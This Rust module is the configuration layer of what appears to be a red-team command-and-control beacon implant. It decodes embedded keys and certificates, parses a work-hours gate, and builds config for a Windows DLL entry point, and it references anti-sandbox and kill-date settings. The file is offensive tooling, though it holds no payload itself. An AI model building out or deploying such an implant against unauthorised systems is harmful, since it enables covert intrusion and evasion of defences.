//! Runtime view of the build-time configuration.
//!
//! `config_generated.rs` (emitted by `build.rs`) holds one
//! `pub const` per `TC2_*` environment variable. This module
//! re-exports each under a stable name and provides small
//! accessors for the two encoded forms — base64 for PEM blobs and
//! DER keys, hex-decoded bytes for the stage key.
//!
//! # Naming conventions
//!
//! - Plain values: SCREAMING_SNAKE_CASE, same as the builder emitted.
//!   `DEFAULT_URL`, `KILL_DAYS`, `ANTISANDBOX`.
//! - Base64-encoded blobs: `_B64` suffix. `SERVER_ECDH_PUBKEY_B64`
//!   decodes to the raw DER public key; `SERVER_PUBKEY_PEM_B64`
//!   decodes to the PEM text. Both are strings at the const level
//!   and bytes after `b64()`.
//! - Hex-encoded byte arrays: emitted directly as `&[u8]`. No
//!   suffix; `STAGE_KEY` is already the raw key.
//! - Numeric: `i32` for integer fields, `f64` for jitter, `bool`
//!   for the toggle flags.

pub use crate::config_generated::*;

// ---------------------------------------------------------------------
// Helpers

/// Decode a base64 string emitted by the builder.
///
/// Returns `Some(Vec::new())` for an empty input so a caller can
/// treat "not embedded" and "embedded but empty" identically, and
/// `None` only when the input is non-empty and malformed — a case
/// that should not occur because the builder produces the base64
/// itself, but is surfaced rather than silently dropped.
pub fn b64(s: &str) -> Option<Vec<u8>> {
    if s.is_empty() {
        return Some(Vec::new());
    }
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD
        .decode(s.as_bytes())
        .ok()
}

/// The agent's signing private key as a UTF-8 PEM string.
///
/// `None` when the build did not embed one — a beacon built
/// without `agent_keypair_path` set. The caller decides whether
/// that is fatal (a pivot parent needs a private key) or benign
/// (a passive agent uses whatever key the server hands it).
pub fn agent_priv_key_pem() -> Option<String> {
    b64(AGENT_PRIV_KEY_PEM_B64)
        .and_then(|v| String::from_utf8(v).ok())
}

/// The server's ECDH public key as raw DER bytes.
///
/// `None` when the build did not embed one — the beacon will
/// speak plaintext on the wire. `bin/beacon.rs` refuses to start
/// in that state unless `TORNADO_ALLOW_PLAINTEXT` is set.
pub fn server_ecdh_pubkey() -> Option<Vec<u8>> {
    b64(SERVER_ECDH_PUBKEY_B64)
}

/// The server's task-signing public key as a UTF-8 PEM string.
pub fn server_pubkey_pem() -> Option<String> {
    b64(SERVER_PUBKEY_PEM_B64).and_then(|v| String::from_utf8(v).ok())
}

/// The mTLS client certificate as a UTF-8 PEM string.
pub fn client_cert_pem() -> Option<String> {
    b64(CLIENT_CERT_PEM_B64).and_then(|v| String::from_utf8(v).ok())
}

/// The mTLS client private key as a UTF-8 PEM string.
pub fn client_key_pem() -> Option<String> {
    b64(CLIENT_KEY_PEM_B64).and_then(|v| String::from_utf8(v).ok())
}

/// The mTLS root CA as a UTF-8 PEM string.
pub fn root_ca_pem() -> Option<String> {
    b64(ROOT_CA_PEM_B64).and_then(|v| String::from_utf8(v).ok())
}

/// The engagement-wide pivot private key as raw DER bytes, on the
/// parent side of a pivot build.
pub fn pivot_priv_key() -> Option<Vec<u8>> {
    b64(PIVOT_PRIV_KEY_B64)
}

/// The engagement-wide pivot public key as raw DER bytes, on the
/// child side of a pivot build.
pub fn pivot_pub_key() -> Option<Vec<u8>> {
    b64(PIVOT_PUB_KEY_B64)
}

/// Parse an `HH:MM` time-of-day into minutes since midnight.
///
/// Returns `None` for anything that is not a zero-padded or bare
/// `H:MM` / `HH:MM` pair with valid hour and minute fields. The
/// caller decides whether the failure is fatal — `parse_clock`
/// below wraps this with the work-hours semantics.
pub fn parse_hh_mm(s: &str) -> Option<u16> {
    let s = s.trim();
    let (h, m) = s.split_once(':')?;
    let h: u16 = h.trim().parse().ok()?;
    let m: u16 = m.trim().parse().ok()?;
    if h > 23 || m > 59 {
        return None;
    }
    Some(h * 60 + m)
}

/// Parse the work-hours gate string into minutes since midnight,
/// with the semantics the Go tree used.
///
/// - `""`, `"off"`, `"disable"`, `"none"` → `0` (gate disabled).
/// - A valid `HH:MM` → minutes since midnight.
/// - Anything else → the caller-supplied `default`.
///
/// Called from `bin/beacon.rs` with defaults `480` (08:00) and
/// `1140` (19:00), matching the Go `clock()` helper's behaviour.
pub fn parse_clock(s: &str, default: u16) -> u16 {
    match s.trim().to_lowercase().as_str() {
        "" | "off" | "disable" | "none" => 0,
        _ => parse_hh_mm(s).unwrap_or(default),
    }
}

// ---------------------------------------------------------------------
// DLL entry-point config
//
// `lib.rs::DllMain` needs to construct the same `Config` the
// executable `main()` builds. Rather than duplicate the ~50 field
// initialisation in `lib.rs`, expose it here as a function that the
// DLL entry point calls. The executable `bin/beacon.rs` does the
// same construction inline; the two share the consts, not the
// function, because the executable applies the plaintext-safety
// check before constructing and the DLL path is used only when the
// operator has already made that decision at build time.
#[cfg(all(feature = "dll", target_os = "windows"))]
pub fn dll_entry_config() -> crate::core::agent::Config {
    crate::core::agent::Config::from_consts()
}